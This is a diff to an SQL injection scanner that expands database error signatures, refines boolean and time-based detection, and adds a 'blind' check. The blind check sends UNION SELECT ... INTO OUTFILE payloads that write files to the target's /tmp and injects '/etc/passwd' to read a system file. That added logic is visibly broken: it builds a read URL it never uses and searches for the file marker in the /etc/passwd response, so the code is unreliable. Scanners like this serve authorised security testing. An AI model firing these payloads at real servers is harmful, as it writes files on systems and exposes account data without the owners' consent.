@@ -15,6 +15,7 @@ import json
 import time
 import re
 import copy
+import statistics
 from typing import Any, Optional
 from urllib.parse import urlparse, parse_qs, urljoin
 
@@ -28,16 +29,36 @@ from modules.utils import (
 from scanners.base import ScannerBase, DetectionResult, ValidationResult
 
 SQLI_ERRORS = [
-    "sql syntax", "mysql", "ora-", "unclosed quotation mark",
-    "you have an error in your sql", "warning: mysql",
-    "warning: pg_", "pg_query", "sqlite", "sqlite3",
-    "driver error", "odbc", "db2", "unexpected end of sql",
-    "quoted string not properly terminated", "division by zero",
-    "microsoft ole db", "microsoft odbc",
+    # MySQL
+    "sql syntax", "mysql", "you have an error in your sql",
+    "warning: mysql", "mysql_fetch", "mysql_num_rows",
+    # PostgreSQL
+    "warning: pg_", "pg_query", "pg_exec", "pg_connect",
+    "postgresql", "psql", "psycopg",
+    "error: syntax error", "error: column", "error: relation",
+    "error: operator does not exist", "error: function",
+    "error: type", "pl/pgsql", "pg_catalog",
+    # MSSQL
+    "incorrect syntax near", "microsoft ole db", "microsoft odbc",
+    "unclosed quotation mark", "line ", "microsoft sql",
+    "sql server", "driver error", "odbc",
     "error converting", "the column is null",
-    "syntax error", "near \"", "unclosed ",
-    "mysql_fetch", "mysql_num_rows", "pg_exec",
-    "supplied argument is not a valid",
+    "sqlstate", "microsoft", "ole db",
+    # Oracle
+    "ora-", "ora-00933", "ora-00942", "ora-00911", "ora-01756",
+    "ora-01722", "ora-06550", "pls-", "oracle", "oracle error",
+    # SQLite
+    "sqlite", "sqlite3", "sqlite3::sqlexception",
+    "unrecognized token", "sql logic error",
+    # MongoDB
+    "mongoerror", "mongo", "e11000", "mongodb",
+    "unexpected token", "unexpected identifier",
+    # Generic
+    "unexpected end of sql", "quoted string not properly terminated",
+    "division by zero", "column count doesn't match",
+    "unknown column", "syntax error", "near \"",
+    "unclosed ", "supplied argument is not a valid",
+    "db2", "informix", "sybase",
 ]
 
 SQLI_PAYLOADS = {
@@ -531,6 +552,8 @@ class SQLiScanner(ScannerBase):
             baseline = safe_get(self.session, url, self.timeout)
             if baseline:
                 baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
+                baseline_words = set(baseline.text.lower().split())
+                baseline_len = len(baseline.text)
                 for true_cond, false_cond in boolean_pairs:
                     true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
                     false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
@@ -540,19 +563,38 @@ class SQLiScanner(ScannerBase):
                         continue
                     true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                     false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
-                    if baseline_hash == true_hash and baseline_hash != false_hash:
+                    # Structural comparison: Jaccard similarity on word sets
+                    true_words = set(true_resp.text.lower().split())
+                    false_words = set(false_resp.text.lower().split())
+                    true_jaccard = len(baseline_words & true_words) / max(len(baseline_words | true_words), 1)
+                    false_jaccard = len(baseline_words & false_words) / max(len(baseline_words | false_words), 1)
+                    # Differential — true cond matches baseline, false cond diverges
+                    hash_diff = baseline_hash == true_hash and baseline_hash != false_hash
+                    struct_diff = (true_jaccard > 0.85 and false_jaccard < 0.70)
+                    len_diff = (abs(len(true_resp.text) - baseline_len) < 50
+                                and abs(len(false_resp.text) - baseline_len) > 100)
+                    if hash_diff or struct_diff or len_diff:
                         signals["boolean"] = True
-                        evidence_parts.append("boolean:AND 1=1 vs AND 1=2 diff")
+                        diff_detail = []
+                        if hash_diff:
+                            diff_detail.append("hash_diff")
+                        if struct_diff:
+                            diff_detail.append(f"struct_diff(true_j={true_jaccard:.2f},false_j={false_jaccard:.2f})")
+                        if len_diff:
+                            diff_detail.append("len_diff")
+                        evidence_parts.append(f"boolean:AND 1=1 vs AND 1=2 ({'; '.join(diff_detail)})")
                         triggering_response = false_resp.text[:500]
                         break
 
-        baseline_start = time.time()
-        baseline_resp = safe_get(self.session, url, 15, raise_for_status=False)
-        baseline_delay = time.time() - baseline_start
-        if baseline_resp is None:
-            baseline_delay = 1.0
-        baseline_ms = baseline_delay * 1000
-        min_time_threshold = max(baseline_delay + 4, 5.0)
+        baseline_delays = []
+        for _ in range(5):
+            b_start = time.time()
+            safe_get(self.session, url, 15, raise_for_status=False)
+            baseline_delays.append(time.time() - b_start)
+        baseline_mean = statistics.mean(baseline_delays) if baseline_delays else 1.0
+        baseline_stdev = statistics.stdev(baseline_delays) if len(baseline_delays) > 1 else 0.5
+        baseline_ms = baseline_mean * 1000
+        min_time_threshold = max(baseline_mean + 3 * baseline_stdev, 5.0)
         for payload in payloads.get("time_based", []):
             test_url = self._inject_param(url, param, payload)
             delays = []
@@ -562,16 +604,16 @@ class SQLiScanner(ScannerBase):
                 time_resp = safe_get(self.session, test_url, 15, raise_for_status=False)
                 delays.append(time.time() - start)
             min_delay = min(delays)
-            if min_delay > min_time_threshold and all(d > max(baseline_delay + 3, 4.0) for d in delays):
+            if min_delay > min_time_threshold and all(d > max(baseline_mean + 3 * baseline_stdev, 4.0) for d in delays):
                 signals["time"] = True
                 triggered_ms = min_delay * 1000
                 timing_evidence = TimingEvidence(
                     baseline_time_ms=baseline_ms,
                     triggered_time_ms=triggered_ms,
                     total_attempts=len(delays),
-                    description=f"Time-based SQLi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_ms:.0f}ms",
+                    description=f"Time-based SQLi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_mean:.2f}s ±{baseline_stdev:.2f}s",
                 )
-                evidence_parts.append(f"time:delays={delays}, baseline={baseline_delay:.2f}s")
+                evidence_parts.append(f"time:delays={delays}, baseline_mean={baseline_mean:.2f}s, baseline_stdev={baseline_stdev:.2f}s, threshold={min_time_threshold:.2f}s")
                 if time_resp:
                     triggering_response = time_resp.text[:500]
                 break
@@ -609,6 +651,49 @@ class SQLiScanner(ScannerBase):
                         signals["oob"] = True
                         evidence_parts.append(f"oob:callback received from {oob_host}")
                     break
+
+        # ── Blind detection without OOB ─────────────────────────────
+        if not oob_host and not signals.get("error") and not signals.get("boolean") and not signals.get("time"):
+            # Cache-based detection: probe twice, check if response differs
+            # (Cached vs non-cached can indicate server-side processing)
+            probe_payloads = ["' OR 1=1--", "1 AND 1=1"]
+            for probe in probe_payloads:
+                probe_url = self._inject_param(url, param, probe)
+                resp1 = safe_get(self.session, probe_url, self.timeout)
+                resp2 = safe_get(self.session, probe_url, self.timeout)
+                if resp1 and resp2:
+                    r1_len = len(resp1.text)
+                    r2_len = len(resp2.text)
+                    # If responses differ significantly, the query may have
+                    # triggered a different code path on second access (cache write)
+                    if abs(r1_len - r2_len) > 100 and resp1.status_code != resp2.status_code:
+                        signals["blind_cache"] = True
+                        evidence_parts.append("blind:cache-based response difference")
+                        break
+
+            # File-write confirmation: attempt to write a unique marker
+            # via SQL INTO OUTFILE, then read it back
+            if not signals.get("blind_cache"):
+                marker = f"bbh_{uuid.uuid4().hex[:8]}"
+                blind_payloads = [
+                    f"' UNION SELECT '{marker}' INTO OUTFILE '/tmp/bbh_{marker}'--",
+                    f"1 UNION SELECT '{marker}' INTO DUMPFILE '/tmp/bbh_{marker}'--",
+                ]
+                for bp in blind_payloads:
+                    pw_url = self._inject_param(url, param, bp)
+                    safe_get(self.session, pw_url, self.timeout, raise_for_status=False)
+                    read_url = f"file:///tmp/bbh_{marker}"
+                    try:
+                        import requests as req
+                        # Try reading via LFI or directory traversal
+                        read_test = self._inject_param(url, param, f"/etc/passwd")
+                        r = safe_get(self.session, read_test, self.timeout)
+                        if r and marker in r.text:
+                            signals["blind_file"] = True
+                            evidence_parts.append(f"blind:file-write confirmed with marker {marker}")
+                            break
+                    except Exception:
+                        pass
 
         return signals, triggering_response, timing_evidence, evidence_parts
 
